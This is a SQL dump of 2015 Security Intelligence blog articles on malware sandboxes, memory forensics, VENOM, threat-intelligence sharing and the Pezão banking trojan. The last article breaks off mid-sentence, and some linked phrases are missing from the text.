INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (410, 'Comparing Free Online Malware Analysis Sandboxes', 'Koen Van Impe', '2015-6-1', 'Corporate computer networks face   on a daily basis. Some of these threats consist of malware that is not yet recognized and, as a consequence, is not stopped by security solutions. This malware eventually ends up on a victim’s workstation or on a corporate server, where it can cause havoc. Malware analysis sandboxes can be used to extract useful information from this type of malware to improve your protection level. When a security incident is caused by malware, it is important to contain the incident, assess the damage it has caused and extract information on its behavior. Collecting this information allows you to find other similar infections on your network and develop updated protection rules for your existing security infrastructure. This collected information can serve as an indicator of compromise (IOC). These are artifacts on a computer that indicate a high likelihood of an infection. It is intelligence that you can use and share — for example, via   — to update your security devices. What type of information will you be looking for? Ask yourself the following questions: \n How do you find the answers to these questions? If you have an infected machine, you can analyze it. Often, there’s not enough time to conduct a thorough investigation. It might even be difficult to pinpoint the exact malware that caused the issue. If you have a sample of the malware, you can apply static analysis and extract the parts of the information that are useful to you. But this will not give you the same information as observing how the malware behaves in a controlled environment such as a sandbox. There are three basic types of sandboxes: Having a custom-built lab or a purchased solution is not always available for everyone, either because it is too complex, too time consuming or too expensive. That is when the free malware analysis sandboxes can help. Their reports on analyzing malware are meant to give you a basic initial view on what the malware does and provide easy extraction of some basic IOCs. Public sandboxes are, obviously, publicly available. You should understand that everything you share or upload to these sandboxes is accessible to everyone — including the bad guys. There are a number of circumstances where you do not want to upload your samples to a public service. If you upload a malware sample that was specifically targeted for your environment, then you’re essentially giving away to your adversaries that you have detected their operations. Similarly, it’s not a good idea to upload samples that contain specific information about your environment, such as hard-coded passwords or configuration settings. You should also refrain from sharing samples that contain confidential user or customer data or material that is copyright-protected. Don’t forget, you’re sharing these files with the whole world. If you run into a situation where you cannot use a public sandbox, then you should run an on-premises sandbox. Note that some   might automatically submit your samples to their networks without clearly notifying you. This is important to consider when you do the pre-analysis.  is a subsidiary of Google that analyzes files and URLs. Apart from the free interface, VirusTotal also has both a private and a public API. The results from VirusTotal include the detection results of the malware by the supported   engines. Although these engines are not exactly the same as the ones used by end users, they give information that tells you if the uploaded malware is already detected. This allows you to better evaluate if you are at risk. You can upload different types of files, such as a Windows executable, Android APKs, PDFs, images and JavaScript code. The online reports are not individually downloadable, but they are very detailed. They give you everything you need to know on what files the malware accessed, what it changed in the registry and how it behaved. It is not possible to download the analyzed samples or get a network capture of what happened. The online report does give you an overview of the detailed network requests.  is developed by the International Secure Systems Lab and analyzes both files and URLs. It supports Windows executable files and Android APKs. Although the interface isn’t as slick as some of its counterparts, it gives you access to everything that you need to know. The reports can be downloaded as HTML, XML, PDF or text. You can download the network captures in pcap format, but you cannot download the samples. Anubis reports also tell you if the malware communicated with specific device paths. The   sandbox is powered by Payload Security. It only analyzes files and does not do URLs. It supports Windows executable files, Office files, PDF files and executable JAR files. You can download the reports, the network captures and the samples. The reports indicate YARA signature matching and give you information on possible anti-VM emulation checks — a technique often used by malware to prevent analysts to run the sample in a virtualized environment. The reports and analysis interface are very appealing, with an intuitive access to the necessary details. The sandbox from   is a free malware analysis service and is community-operated by volunteer security professionals. It only analyzes files and does not do URLs. It is built on top of the Cuckoo sandbox and supports Windows executables. You can download the samples if they are shared by the uploader. A downloadable network capture is not available, but you do get, for example, the full HTTP request in the online report. If you cannot set up your own Cuckoo sandbox, this is an excellent replacement solution. A useful addition to Malwr is a visualization provided by  . You first have to analyze the file with Malwr and then use the returned reference URL to feed the visualizer. Below is a table comparing the features of the different online sandboxes. They all run different Windows flavors. The configurations are basic, but of course, these will always be different from your real production environment. This is something you’ll have to live with when using a free public sandbox. All of the malware sandboxes provide the upload service via a secured SSL connection and give screenshots of what visually happened. Free online sandboxes are a great replacement if you do not have your own in-house solution. They provide good information for a basic analysis and getting some early indicators ready to scan your infrastructure for existing infections. It also provides a quick way to further  . There are some limitations, however. Integrating the information from the online reports with your own environment still requires some manual work; having access to an API will greatly improve this process. They are also not fitted for analyzing targeted malware and evaluating how malware behaves in a specific environment. Beyond these limitations, these online tools give you good initial insight on malware behavior and are an excellent addition to your toolset for protecting your infrastructure.', '\'CybOX\', \'Infrastructure\', \'Malware\', \'Malware Analysis\', \'Sandbox\', \'Sandboxing\', \'STIX\', \'TAXII\', \'Threat Intelligence\'', 'https://securityintelligence.com/comparing-free-online-malware-analysis-sandboxes/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (411, 'Proactive Threat Hunting and Memory Forensics Against Rombertik', 'Zubair Ashraf', '2015-5-28', 'Rombertik was in the news during the beginning of the month, with many headlines specifically mentioning its ability to bypass sandboxes. This malware was initially identified by  , which then got others talking about it, too — mostly along the lines of how it is easily analyzed by various sandboxes. In the meantime, I have been planning to start a series of how advanced threats can be identified by using the practice of proactive threat hunting that Andrew Case described at  . Let’s kick off the series on proactive threat hunting with looking at how performing endpoint analysis can help us detect and analyze Rombertik. I took a shot at  , but it did not flag anything, as shown below: One of the things I realized is that CrowdStrike is only submitting hashes on running processes to VirusTotal. I think a nice feature would be to gather what has been made persistent and submit those hashes, too; Sysinternals’ latest version of   is pretty useful for this. We can easily detect the newly persistent executable as malicious or suspicious by either looking at the results returned from VirusTotal or comparing it with what are known to be good or pristine images, as shown in the screenshots below: \n The yfoye.bat file will lead us to yfoye.exe with the  . Even if VirusTotal didn’t detect it, you would still investigate further during proactive threat hunting and may check with other sandboxes. If the file hashes of malware are not already known to VirusTotal or other public sandboxes, you should excercise caution and not just submit it to public domain without understanding the full scope of compromise. Otherwise, this may prematurely warn the attackers to change their tactics, causing you to do a partial remediation that could potentially leave holes for the attackers. In terms of free sandbox analysis services, I found the free   service results to be good.   does a decent job, too, although their   was not as impressive. If you were to do a forensic examination of your endpoint, you can use techniques like file creation and modification time to find the original binary that resulted in dropping yfoye.exe in the startup folder. It would be interesting to experiment with a local   deployment and see what changes are needed to analyze this sample. Next, I would like to share how   can help us detect and analyze this malware. I infected a Windows 7-by-86 image with a   and used the   to get before and after memory images. In the future, I would love to see someone use Rekall’s VM introspection feature for this. Here is how various volatility plug-ins help us to detect the presence of malware and further analyze it. I find that one of the good ones to get started with is  . It can be used on the infected image and — better yet — if the results can be compared those on a clean image, it can also help highlight the suspicious processes to be further examined with other volatility plug-ins. Running openioc_scan as: will show you signs of code injection, process hallowing, etc. Below are some examples: This would help us see that the endpoint is infected, raising alerts for browser hooks and yfoye.exe. As for Autoruns, from memory image, the   plugins didn’t detect the visual script, likely because it is using the startup folder and not registry entries. Next, we try the   plugin, and it points out interesting things such as: These hook codes can be extracted using several plugins and analyzed further. I hope this drives home the importance of proactive threat hunting, and also how memory forensics can be an amazing means of  . Should you need help with either of these efforts, consider integrating your own   system into the process and gleaning forensic data from its information.', '\'Cyber Forensics\', \'Malware\', \'Memory Forensics\', \'Threat Detection\'', 'https://securityintelligence.com/proactive-threat-hunting-and-memory-forensics-against-rombertik/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (412, 'HTTP(S) Visualization With Hviz', 'Brad Harris', '2015-5-26', 'Machine learning algorithms are essential for finding patterns in data. Data mining and predictive analytics can identify patterns in extremely high-dimensional data — using millions and millions of data points for millions and millions of users — that no human could possibly detect. However, machine learning algorithms still struggle with visual patterns. Object recognition is a hot area of research for everything from robotics to autonomous cars. Hongxing Wang, Gangqiang Zhao and Junsong Yuan have written an excellent paper, “ ,” that surveys the current techniques and the challenges of the task.\n This is where humans come into play. The human brain is amazingly good at finding visual patterns. If data can be visualized, a human can often discover the correlations that machine object recognition cannot. While it is true that humans can sometimes discover false positives or patterns that are actually meaningless, they are still better at visual pattern parsing than any machine learning algorithm.\n On March 24, 2015, at the Digital Forensics Research Workshop for Europe (DFRWS EU), researchers presented a fascinating paper, “ ,” which went on to win paper of the year honors. In it, they discuss Hviz, a new visualization approach to HTTP and HTTPS traffic that has the potential to simplify how cybersecurity experts investigate malicious events.\n Hviz allows investigators to visualize the metadata of HTTP and HTTPS traffic and classify it as originating from a user or a process, such as malware. It helps to visualize the event timeline of Web traffic and allows a forensic investigator to “see” the relationships of Web requests in a hierarchical manner. This allows investigators to identify patterns that they might never have found looking through the raw data.\n The authors investigated trace data from a college campus and found that the average Web request resulted in 110 follow-up requests from each individual page. More disturbing is the observation that those Web pages, on average, came from 20 different domains. This is a daunting concept for an investigator, and without some form of aggregation and filtering, it is nearly impossible to summarize and analyze.\n To get the full description, including specifics such as building the request graphs and the preprocessing and visualization steps, I urge you to read the paper. However, to summarize, Hviz looks for referrer and host headers to paths through the data. For example, a request to a website from a search engine sends that page’s server a referrer header telling it that the link came from that engine. The referrer headers form a stream of HTTP or HTTPS traffic, originating at a head request generated by a user or process. This allows a path to be drawn from each node of the request graph to the next, forming a chain of links that the user followed from page to page. Note that in its current incarnation, these are the only headers examined.\n It also looks for traffic that occurs by multiple workstations and allows the user to fade them out so they do not “clutter” the visualization. This would generally allow malware to be spotted unless it happens to be a worm. If the malware is a worm, then potentially the same or similar traffic would originate from each workstation. Hviz would consider this as “popular” and would mark them as such, therefore fading them out of the display by default. The investigator can elect to expand these, however, to get a visualization of the sites that multiple workstations visited.\n The visualization process uses several strategies to manage data and eliminate excess information. For example, Hviz collapses domains. That means a.example.com and b.example.com are reduced into one visual node. This is based on the intuition that pages from the same domain are probably related to each other and may be an embedded object, so they probably originated from one request.\n Hviz takes advantage of heuristic analysis when it comes to third-party requests. Requests to those 20 or so domains occur on multiple pages of the primary website and can be collapsed, as well. This is because they most likely all originated from a single user’s request.\n Uploads are noted as special since they are rare in normal traffic. If Hviz sees an upload, it is flagged as unique. These uploads may mark malware attempting to exfiltrate data.\n The referrer links are only part of the process. For example, Hviz must be able to identify head nodes, or those nodes requested by a client, from embedded requests. This is critical in order to collapse the visualization. To do this, the authors use a heuristic approach outlined in the paper “ .”\n See the paper for a more complete description of the ReSurf heuristic used by Hviz. Essentially, it looks for how many incoming edges of a referrer graph are connected to a node versus outgoing edges. Head requests are those that generally come with no referrer, or perhaps one referrer that is itself a head request. A “referrer graph” is a directed graph generated from Web requests from a client IP address. ReSurf then uses the referrer and host headers to construct a directed graph of the IP’s Web requests and capture timing relationships between the requests. In this case, the heuristic is that closer timing indicates an embedded request.\n Section 3.1 of the ReSurf paper goes into a thorough description of the rules and heuristics used to identify head requests and separate out embedded requests from the head page. It uses several thresholds that can be tuned to make the referrer graph more accurate. Hviz uses these methods to identify head requests.\n A directed graph is a graph in which the edges are singly linked. That is, there is an edge from node A to node B, but not one from node B to node A unless that edge from B to A represents a forward path in the graph. A standard directed graph may rejoin itself, but in Hviz’s implementation, there is no reciprocation. Hviz also has no notion of weighted edges, which many directed graphs utilize.\n Much of the processing in Hviz is done by the construction of a “request graph.” This graph is also a directed graph and is similar to a referrer graph. It is designed to visually demonstrate the relationships between head nodes and those nodes triggered by head nodes, such as embedded nodes or pages referred to by that top-level domain. This allows the investigator to move from head node to head node and get a graphical understanding of how a user’s Web traffic proceeded chronologically.\n For a picture of what the typical interface looks like, see Figure II of the original Hviz paper, or go to an  .\n There are a few problems with this approach as it applies to  . Malware could start using a popular website for communications so there is a valid referrer header, for example. In this scenario, investigators would see a potentially larger-than-normal number of referrals from a popular site. One solution to this problem might be to add the notion of weighted data to the graph. This way, one could collapse referrer edges from one workstation from page to page and show them as a different color based on their weight. Weights increase the more that particular edge is created, so it would be easy to see which chain of sites is most often visited from each workstation. This should visually reveal malware that is forging referrer headers.\n If the graph included the notion of edges connecting back to other points, as many directed graphs do, the visualization would include users who “double back” on themselves — for example, a user who performs a search, clicks a link, then goes back to the search page and clicks the link again. This would also help to visualize malware. Many malware samples will forge several referrer headers and visit a few sites for command-and-control and exfiltration.\n One could track head nodes used as referrers that never load the associated embedded objects of that head node. For example, a search even from the address bar loads the search results page, which comes with either no referrers or very few. This would identify the search page as a head node, as described in the ReSurf heuristic. The search results page is loaded along with its embedded objects. If there are head node referrers without the loading of embedded objects, this could be called out as a node that does not collapse.\n Hviz uses network traces to collect data, so browser caching is a problem for this heuristic. A solution might be to add a JavaScript agent into the  . The visualization is already done through JavaScript. If this is impractical, the traces would still show items like different advertisements, which would often change from visit to visit. In this case, tracking head nodes with no embedded content loaded would still be viable. This approach would show malware that forges headers from popular head nodes but does not actually load the page every time. It can’t just forge a popular referrer header because the lack of a real visit to the site would show in the visualization.\n There might need to be some extra data checking to clear up the visualization. If there’s a worm present, for instance, it will make requests from multiple computers, and it will be faded out due to popularity unless the investigator specifically wants to see those requests. However, if the embedded objects are not loaded from an identified head node, this will allow the investigator to identify those nodes in the visualization, which needs to be expanded for the identification of worms.\n Real-world investigative processes influence how researchers can   in the world of cybersecurity. Whether these resources include timelines, categorization of artifacts, visualization of entity relationships or similar strategies, they can assist investigators in organizing data in a way that streamlines forensics and helps them locate malicious activity.\n The sheer volume of HTTP(S) traffic makes it incredibly difficult for an investigator to find malware communication. There is a need for a tool that helps the investigator use the human brain’s remarkable ability to find visual patterns to sort through normal versus malicious traffic. Hviz fills this exact need. It has the potential to be some of the most fascinating network forensics to come along in a good while.', '\'Analytics\', \'Big Data\', \'Big Data Analytics\', \'Cyber Forensics\', \'Data Visualization\', \'Forensics\', \'Incident Forensics\', \'Security Analytics\'', 'https://securityintelligence.com/https-visualization-with-hviz/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (413, 'When Vendor Security Vulnerabilities Become Your Own', 'Kevin Beaver', '2015-5-22', 'One of the most common challenges enterprises face in information security is dealing with  . Whether it’s a security flaw located in a network appliance, a client/server program or a custom-developed application, you’re often the one on the hook to get things resolved. I’m not talking about known security vulnerabilities that are easily fixed by applying an existing patch. Rather, I’m referring to unique security flaws that you or someone else uncovers in the process of doing business. Perhaps it’s a security flaw that is exclusive to your own environment or workflows. Such vulnerabilities include: When these types of   surface, they can create unnecessary risks for your organization. Regardless of whether vendors ultimately resolve the known security flaws, you’re still going to be responsible for getting things settled or finding compensating controls — and sooner as opposed to later. Even when your hands are tied, such flaws can reflect poorly on the security posture of your environment and leave your business at risk. Many people reviewing vulnerability scans or security assessment reports often won’t know — or don’t care — that you are unable to resolve certain issues directly. All that matters is the fact that the vulnerability exists. When you become aware of security vulnerabilities that can only be resolved by an outside party, the most obvious thing to do is to forward along the information to the vendor, get feedback and hope it will provide a fix. Based on my experience, however, outside parties can be reluctant to acknowledge the security concerns. Some who do listen are often not motivated to resolve the issues. This apathy may exist because you’re not a large enough customer, because they don’t fully understand the ramifications of the risks involved or because you’re speaking with the wrong person altogether. One of the best things that you can do is provide tangible evidence of the security  , either from your own internal testing or, ideally, from an outside party. You’ll want to include the specific areas of the system that are affected, what information or systems are being put at risk and how the vulnerability can be exploited, along with proof including screenshots, HTTP requests and responses and the tools used so it can be replicated in the vendor’s environment. If you cannot get any resolution directly from the vendor, there are often security controls you can put in place to reduce or eliminate the risks, such as an intrusion prevention system (IPS) or Web application firewall (WAF) rules, more stringent network segmentation and network share permissions. There are likely other vendors that take security more seriously that would love to have your business. Beyond acknowledging the risk, the most important thing is to remain diligent and ensure that a fix — regardless of where it comes from — is put in place. Otherwise, it’s a breach in the making, and you don’t want to have to take that on.', '\'Application Security\', \'Responsible Disclosure\', \'Security Solutions\', \'Third-Party Vendors\', \'Vulnerabilities\'', 'https://securityintelligence.com/when-vendor-security-vulnerabilities-become-your-own/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (414, 'Does the VENOM Vulnerability Affect You?', 'Koen Van Impe', '2015-5-21', 'Researchers from   recently revealed a security flaw in a popular virtualization software. The vulnerability was dubbed VENOM, short for Virtualized Environment Neglected Operations Manipulation, and assigned the distinction  .  is a vulnerability called a guest escape bug. It may allow attackers to work around their status as a virtual machine (VM) guest and infiltrate the data network, potentially granting them code execution access to the host. The flaw is situated in the virtual floppy drive code (FDC) and cannot be exploited remotely. An attacker needs local access in order to get into the hypervisor. Xen, KVM, VirtualBox and the native QEMU client are vulnerable. VMWare, Microsoft Hyper-V, Linode and   instances are not affected. But even if you don’t use a virtual floppy, you might still be vulnerable. The vulnerability may have been added by default or because — in the case of Xen and QEMU — an unrelated bug causes the vulnerable FDC code to remain active and exploitable by attackers. Should the cybercriminal gain access to the host system, it could lead to lateral attacks against the hosting environment, endangering other VMs. The attacker could then gain entry to the local network of the host and its adjacent networks. As a result, the cybercriminal could have access to sensitive user and customer data stored in the affected VMs. Cybercriminals must meet certain requirements in order to obtain private information. To start, the attackers need to have root-level privileges — making them so-called “super users” — on the guest machine. This is probably not a real issue because an attacker could rent a VM from a cloud computing service and exploit the hypervisor from there. Further exploitation depends on the protective measures put in place by the cloud provider. For code execution, the attacker needs knowledge of the memory layout of the QEMU process. Using address space layout randomization (ASLR) might make it more difficult, but not impossible, for an attacker to achieve this. While the   was only discovered somewhat recently, vendors have sprung into action to prevent further damage. Most have already released a patch. And although a proof of concept exploit exists, currently no practical widespread use has been seen. The VENOM flaw itself may be small, but it has the potential to do major damage. If you run your services on a VM with a provider that runs a vulnerable product, then someone who breaks into a VM belonging to another customer of your provider could access all of your data. Imagine your provider does not use isolation. One of its other customers runs a badly configured personal website on a VM. You run your hosted invoicing and customer relations application on another VM. If the vulnerable website of the other customer gets attacked, and the attacker is able to get super user rights on that VM, then the cybercriminal could use the VENOM vulnerability to gain access to your machine. Consequently, the attacker could have access to all the customer data stored in your VM. This could happen regardless of all the security measures that you put in place for protecting your applications, data and machines. Thus, choose your VM provider wisely. Request that it applies relevant patches as soon as possible and verify that it follows best practices for  . There are a few instances that may require you to take action regarding VENOM. Here are three questions to ask regarding your cybersecurity, as well as a possible course of action you’ll need to follow to protect your organization and its customers. Again, while the VENOM vulnerability may seem small, its implications are huge. Be sure that you’re doing all you can to protect both your organization’s and your customers’ data from potential loss.', '\'Cloud\', \'Cloud Services\', \'Third-Party Vendors\', \'VENOM Flaw\', \'Virtual Machine (VM)\', \'Vulnerability\'', 'https://securityintelligence.com/does-the-venom-vulnerability-affect-you/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (415, 'Security Breaches: An Ounce of Prevention?', 'Rick M Robinson', '2015-5-20', 'Security breaches are a fact of life, and the philosophy of cybersecurity today is such that organizations shouldn’t wonder whether they might get hacked, but rather assume they already have been. This blunt realism is necessary in an age where threats are advanced and persistent and every vulnerability is exploited. But one observer of the security scene asks whether, in focusing on   of and response to threats, the security community is forgetting about the power of prevention. Most major security breaches are detected long after they occur, when the damage has already been done. But when an attack is prevented, it does no damage and exacts no costs beyond the preventive measures themselves. The savings are invisible but enormous. As Anup Ghosh wrote on  , the limitation of detection as a basis for cybersecurity is that it so often happens only long after the fact. FireEye’s “ ” calculated that the median time of the detection of security breaches is 205 days. Yet, as Verizon’s “ ” found, 60 percent of breaches allowed the attackers to compromise the victim within minutes. Ghosh characterizes this problem as “falling off the end of the cyber kill chain” — the sequence of events that attackers go through in penetrating a system and attaining their objectives. All too often, threats are detected by  . For example, credit card operations often discover retail breaches before the victimized retailers do. These security breaches can be costly: For a breach of 10 million records, the average cost ranges from around $2 million to $5 million but can soar above $74 million, according to Ghosh. And because the cost from a breach tends to be proportionate to the time before detection, the detection itself needs to be rapid to be effective. In contrast, the cost fallout from a breach that is prevented or blocked at the point of initial intrusion is precisely zero. Thus, says Ghosh, “We should not lose sight that $1 spent on prevention is worth $1 million in post-breach incident response. And, furthermore, as we evaluate detection and response technologies, we should be looking for real-time detection solutions — think machine time, rather than human time.” This capability, in turn, calls for resources like “good sensors, analysis algorithms and an architecture that work in real time containing, identifying and controlling threats.” So while firms need to recognize that   are ongoing and work under the assumption that they have already been hacked, this is no reason to ignore   that can stop many attacks before they begin.', '\'Cybersecurity\', \'Data Protection\', \'Threat Detection\', \'Threat Prevention\'', 'https://securityintelligence.com/security-breaches-an-ounce-of-prevention/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (416, 'Perimeter Protection Is Not Enough', 'Brendan Hannigan', '2015-5-19', 'In 1972, United California Bank was robbed of $30 million, considered the largest bank heist in history. Just this month, a series of cyberthefts at more than 100 banks in 30 countries resulted in the loss of $1 billion. The nature of crime has fundamentally changed, and the stakes are higher than ever with organizations, governments and individuals across the globe as targets. Cybercrime itself has become sophisticated and organized, with cybercriminals turning profits of almost $450 billion annually, much of it from the comfort of their desks. This paradigm shift requires us to change the way we think about and fight cybercrime. Perimeter protection is simply not enough. Today’s threats demand technology steeped in intelligence, leadership and policy. Last week, I had the opportunity to talk to almost 200 C-level executives at our first IBM Security Summit in New York City, focused on these three areas. I was joined by IBM’s CEO Ginni Rometty and several panelists to lay out a   to tackle this enormous problem. The bad guys have become better and better at cybercrime for three main reasons: they collaborate, sharing technology and practices; they automate, making attack platforms quick and easy to use; and they organize, working together to inflict maximum damage. Our defenses need to be updated to fight back. As Ginni Rometty, IBM CEO, outlined in her presentation, we need to think about security like a human immune system. Without a healthy one, you are susceptible to all kinds of disease. Without integrated security solutions that use analytics to find threats before they attack, your organization is compromised. Enterprises need to think about cybersecurity as an integral part of their infrastructure, rather than deploy new point product solutions to combat specific problems. But an individual immune system is not enough. Cybercrime has become a pandemic, and no one company can battle it alone. The good guys need to   and share data in order to make a dent in the scale and scope of cyberthreats. Organizations have been reluctant to share their data and expose their own vulnerabilities. Governments have been struggling with policy for data sharing that does not infringe on privacy. IBM is taking the first steps to mobilize the private sector behind this cause, and we have opened up our extensive threat database to the public to spark global collaboration. Through IBM X-Force Exchange, we are giving organizations a safe, anonymous way to share intelligence and provide a unified view of emerging attacks and malicious activity. In just a month, more than 1,000 organizations in 16 industries have joined X-Force Exchange, showing an eagerness for this type of approach. \n Our efforts will be further supported by public policy that is beginning to surface. The U.S. House of Representatives recently passed the Cyber Intelligence Sharing and Protection Act (CISPA), allowing cyberthreat information to be shared between federal cyber operations centers in real time. The U.S. Senate is expected to vote on the Act within the next few weeks. Andrew Tannenbaum, IBM’s Senior Counsel, Cybersecurity,   about the value of this bill, articulating why it will protect the privacy of individuals rather than comprise it. Cybercrime is a big problem that requires a big response from corporations, governments and even individuals. IBM is in a position to lead the way not only with technology and expertise, but with our differentiated approach to the problem and our focus on clients’ most important needs: optimizing their security program, stopping advanced threats, protecting their most critical assets and safeguarding cloud and mobile. We all need to be a part of the solution. I encourage you to explore  , share your data and insights and advocate for a collective response.', '\'Cybercrime\', \'Cybersecurity\', \'IBM X-Force Exchange\', \'Information Sharing\', \'Security Intelligence\', \'Threat Intelligence\'', 'https://securityintelligence.com/perimeter-protection-is-not-enough/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (417, 'How to Build an IDMS for Automated Infection Validation', 'Brian Foster', '2015-5-18', 'If security professionals are to have any chance of successfully containing advanced threats, they must automate the infection validation processes. The attack vectors are seemingly endless and there are simply too many alerts — many of which are false positives — to investigate and analyze manually. In my last post, I talked about how automation can be achieved via an  . Let’s look at what it takes. An IDMS begins with a big data infrastructure such as a Hadoop cluster and massive amounts of raw data. You can subscribe to intelligence feeds and have them load into the system, along with data from your own security and other network tools.   tools can help in this regard, as well as tools like Splunk, but they only get you partway there. These tools allow a human to run queries off the data you’re gathering, but the queries don’t make a decision for you as to what threats are present on the network, the risks they pose and how they should be addressed. The decision-making aspect requires massive algorithms that essentially tell the system, “If this, then that.” But it is never that simple. In reality, the algorithms are more like, “If   exhibits   behavior for more than   time, set   variable to  .” In order to write these algorithms, data scientists must work closely with security threat experts to understand the variables, their relationship and the desired outcomes. Most importantly, an IDMS requires a software system that sits on top of the big data infrastructure and determines whether a device on the network is infected. This decision-making component must be built by developers, who also put algorithms built by the data scientists into this system’s code infrastructure. The system is now ready to perform automated infection validation, but it will never be “done.” The algorithms are massive programs that are works in progress, changing to accommodate an evolving threat landscape. Security threat researchers, developers and data scientists must continually evaluate and tweak the algorithms, building additional systems that will automate the continuous learning of the models. The process of building and maintaining an IDMS is not easy. It requires very specialized skill sets and is resource-intensive — and those resources are not easy to come by.   are in short supply, and few enterprises can afford them or additional security experts. But that doesn’t change the need for automated infection validation and investigation. I know from talking to enterprises that organizations are attempting to build an IDMS with various levels of success. A recent   survey seems to concur, with 41 percent of respondents claiming to use some automated tools to capture intelligence and evaluate the true threats in a sea of alerts. I’m curious to hear from others. Is this something you’re trying to build today? If so, how are you addressing the challenges and what successes have you had?', '\'Automation\', \'Data Science\', \'Intelligent Decision-Making System (IDMS)\', \'Security Information and Event Management (SIEM)\', \'Threat Intelligence\', \'Threat Protection\'', 'https://securityintelligence.com/how-to-build-an-idms-for-automated-infection-validation/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (418, 'Information Sharing Is Key to Managing Cyber Risks', 'Pamela Jones', '2015-5-14', 'With high-profile cyber intrusions and data breaches growing in magnitude, sophistication and complexity with each passing day, the need to foster   among businesses and other organizations is more important than ever. For years, securing networks was a relatively contained matter. Today, however, businesses can have millions of users accessing their systems, and the volume of data that has to be secured is staggering — and growing by the second. In   before the U.S. House of Representatives Permanent Select Committee on Intelligence, IBM Cybersecurity Counsel Andrew Tannenbaum asserted that “companies know that they cannot eliminate all cybersecurity risk” because the threats are “simply too diverse and dynamic.” Therefore, enterprises need to adopt a   approach to cyberthreats. This includes identifying potential risks in their IT systems, prioritizing the mitigation of those risks and allocating security resources accordingly. A critical element of any enterprise-level cybersecurity risk management program is the ability to rapidly receive and use actionable data about the latest threats. With new threats evolving constantly, organizations need to be able to share such data quickly to keep one another a step ahead of the hackers. Tannenbaum urged members of Congress to pass information sharing legislation as quickly as possible. He detailed three vital elements that would make a cybersecurity bill truly effective: As businesses confront the growing challenges of securing critical systems, we must make a concerted effort to expand and accelerate the sharing of cyberthreat information, all while ensuring proper privacy safeguards. The exchange of information will help companies adapt more quickly to evolving attacks, enhance the use of sophisticated   and improve the ability of organizations to thwart cyberthreats in real time. IBM is taking the lead to mobilize the private sector behind this cause. That’s why last month IBM opened up its vast library of security intelligence data to the public in a free community called the  . In just a short period of time, more than 1,000 organizations have joined the X-Force Exchange, including some of the world’s largest banks and retailers. As noted by Tannenbaum, the passage of information sharing legislation can help improve and expand this data flow even further, helping protect the networks of enterprises worldwide.', '\'IBM X-Force Exchange\', \'Information Sharing\', \'Security Intelligence\', \'X-Force\'', 'https://securityintelligence.com/information-sharing-is-key-to-managing-cyber-risks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (419, 'From the Dark Web to Your Data: Uncovering the Life of a Cyberthreat With Community Knowledge', 'Pamela Cobb', '2015-5-14', 'The war on cybercrime is larger than ever, and the enemy has changed its tactics. Hackers today operate as sophisticated groups of cybercriminals on the   with advanced tools, resources and a wealth of best practices at their fingertips. It is this organizational construct — it’s estimated that   of cyberattacks are driven by crime rings — that has put digital crime on the map as one of the largest illegal economies in the world, with global profits reaching  . As security professionals, we need to adopt the same collaborative approach. As you’ll see in this video, we can work together to exchange expertise and real-time threat information, ensuring immediate action can take place to stop cybercriminals in the Dark Web. The time of security data sharing is upon us. While our technologies, companies, industries and communities are more interconnected than ever, giving us an incredible amount of intelligence to rapidly track the movements and methods of hackers and quickly contain their attacks, we have struggled to obtain the same level of coordination and   as criminals operating in the ominous Dark Web. To help set the example of sharing data, IBM opened its own threat data to the public when it launched the IBM X-Force Exchange platform last month. Designed to foster collaboration and democratize cybersecurity intelligence across companies and industries, X-Force Exchange leverages IBM’s ever-growing 700 TB threat intelligence database of actionable cyberthreat information. This includes two decades’ worth of malicious cyberattack data from IBM as well as anonymous threat data from more than 15 billion security events from IBM’s managed security operations. In just the one month since we took this step to give organizations a collaborative way to share intelligence, more than 1,000 organizations across 16 industries have joined the   threat intelligence network. Participants have created more than 300 new collections of threat data in the last four weeks alone, and 1,000 data queries per day have been made from organizations around the world. These organizations include six of the world’s top 10 retailers and five of the top 10 banks, as well as top-10 companies across the automotive, education and tech industries. As more partners join us in this battle, the platform will continue to grow and its vault of intelligence will become more valuable. Similar to the world illustrated in the video, we can combat cybercrime in the only way possible: together as an open community.', '\'Cybersecurity\', \'Dark Web\', \'IBM X-Force Exchange\', \'Information Sharing\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/from-the-dark-web-to-your-data-uncovering-the-life-of-a-cyberthreat-with-community-knowledge/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (420, 'Meet the Pezão Trojan: Brazil’s Got Malware', 'Limor Kessem', '2015-5-13', 'Brazil loses well over   to Internet crime, which happens to be the No. 1 economic crime in the country. For some perspective on that statistic, cybercrime is ranked fourth in rest of the world. With about   of Brazil’s 200 million citizens already using the Internet, there are lots of potential victims to go around, turning cybercrime into lucrative business. It’s not surprising then that Brazil is the   in the world, ranking No. 1 in Latin America and the Caribbean as both a source and target of online attacks. With new variations of malware emerging more often than any other region, Brazil’s got malware! Brazilian malware is the malice of choice in 68 percent of all cyberattacks in the country. Local malicious code is known for a number of typical traits, but most of all for being programmed in Delphi — a rather simplistic approach to create rather simplistic Trojans. Because of that, Brazil has hardly any defined malware families, in the classic sense, with each iteration but a minor customization of something that was used many times before. But this was not the case with a newcomer dubbed Pezão. This simple Trojan has kept the common Brazilian M.O. but refreshed the coding by using dot NET programming instead of Delphi. It’s quite interesting to see a new face in the region. Pezão is an overlay type Trojan, discovered in the wild in early May 2015. It uniquely targets online banking customers in Brazil. Overlay malware forces users to close the browser window they were using and makes them use a browser it can better control — which in this case is Internet Explorer (IE) — under the guise of a security requirement from the bank. In order to steal credentials and token codes, the 